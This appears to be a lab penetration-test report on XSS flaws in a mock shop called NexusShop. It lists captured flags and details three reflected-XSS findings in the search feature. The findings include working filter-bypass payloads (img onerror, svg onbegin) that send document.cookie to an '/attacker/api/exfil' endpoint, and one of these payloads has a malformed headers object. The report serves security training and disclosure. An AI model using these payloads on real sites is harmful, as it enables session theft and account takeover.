# Penetration Test Report - NexusShop XSS Assessment

## Executive Summary

- **Target**: http://web0x0c.hbtn
- **Assessment Date**: 13/08/2026
- **Scope**: It was tested the product's search, product's filter, product's sort, product's review, user's profile, product's info, URL fragment and shopping cart.
- **Summary**: A penetration test was performed on the NexusShop application. **7 critical XSS vulnerabilities** were identified across Reflected, Stored, and DOM-based attack vectors. All flags were successfully captured. The assessment demonstrates that improper output encoding and insufficient input validation allow attackers to steal session cookies, harvest credentials, and capture keystrokes.
- Flags Captured:

|**Vulnerability**|**Flag**|
|-|-
|**Reflected XSS - Basic Search**|7471eaafed9882a1478567bd47dcaccb|
|**Reflected XSS - JavaScript Context**|195b9c795a3ee7c819e4976db97a7b55|
|**Stored XSS - Product Reviews**|c57835c43621f736030aa25a8335d0c7|
|**Stored XSS - User Profile**|6edce12fbaa33f78c7cbbde4e8e4980b|
|**Stored XSS - Markdown Editor**|e7f6e189ed767d62bcd5631f39272e43|
|**DOM XSS: URL Hash Hijack**|e4e6cfc03466548a651b4a0725c9f19a|
|**DOM XSS : postMessage Abuse**|ef81742c90dd66548a73ab0d2a32fbf9|


## Detailed Vulnerability Findings

### Reflected XSS - Basic Search

|Section|Required Content                
|-|-
|Vulnerability Description|The search bar reflects the input directly into the page heading. Improper Neutralization of Script-Related HTML in a Web Page.
|Location|The resources afected for this vulnerability is `/search?q=TESTINPUT`, `/search/filtered?q=TESTINPUT` and `/search/advanced?q=TESTINPUT`
|Attack Vector|**The first vulnerabitlity** was testing the `/search?q=` with a simple XSS Injection, `<script>alert('SCRIPT executes JS commands')</script>`. Then the url `http://web0x0c.hbtn/search?q=<script>alert('SCRIPT executes JS commands')</script>` will execute the alert command in the browser.<br><br> **The second vulnerability** was testing the `/search/filtered?q=` with the same simple XSS Injection, `<script>alert(1)</script>`. This time there were no reflection on the website. Trying other HTML tags it was found that `img` tag was reflecting on the page and with `<img src="x" onerror="alert('IMG bypass filter')">` it was possible to execute JS commands. <br><br> **The third vulnerability** was testing the `/search/advanced?q=` with `script` and `img` HTML tags, but `script` was not reflecting and `img` was blocking event handler. One way to do it was with anchor element and javascript shema `<a href="javascript:alert(1)">Click me</a>`, but that needs user interaction to run. With the `svg` element is possible to run a event handler that was not blocked `<svg><animate attributeName=x dur=1s onbegin="alert('SVG Element bypass filter')"></animate></svg>` and executes the JS command.
|Payload Used|**The first vulnerabitlity**:<br>` <script>setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie\|\|"no-readable-cookie",level:1,stage:1})});fetch("/search/api/track?t="+t)},500)</script> `<br><br> **The second vulnerability**:<br>`<img src=x onerror='setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie\|\|"no-readable-cookie",level:1,stage:2})});fetch("/search/api/track?t="+t)},500)'>` <br><br> **The third vulnerability**:<br>`<svg><animate attributeName=x dur=1s onbegin='setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie\|\|"no-readable-cookie",level:1,stage:3})});fetch("/search/api/track?t="+t).then(r=>r.json()).then(d=>console.log(d))},500)'></animate></svg>`
|Real-World Impact| A threat actor could impersonate another user by stealing session cookies from the victim. That could lead to data theft and malicious actions.
|Remediation|- Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. <br>- Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. <br>- To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly.

